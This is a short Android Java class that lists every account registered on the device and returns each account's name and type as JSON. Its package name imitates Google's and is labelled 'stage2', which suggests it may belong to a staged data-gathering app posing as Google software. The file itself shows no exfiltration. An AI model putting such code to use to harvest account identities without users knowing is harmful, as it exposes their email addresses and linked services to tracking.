package com.google.android.apps.work.stage2;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

public class AccountsInfoGatherer {
    public static String getAllAccounts(Context context) {
        JSONArray jsonArray = new JSONArray();
        try {
            AccountManager accountManager = AccountManager.get(context);
            Account[] accounts = accountManager.getAccounts();
            
            for (Account account : accounts) {
                JSONObject jsonAccount = new JSONObject();
                jsonAccount.put("name", account.name);
                jsonAccount.put("type", account.type);
                jsonArray.put(jsonAccount);
            }
        } catch (Exception e) {
            Log.e("AccountsGatherer", "Error gathering accounts", e);
        }
        
        return jsonArray.toString();
    }
}
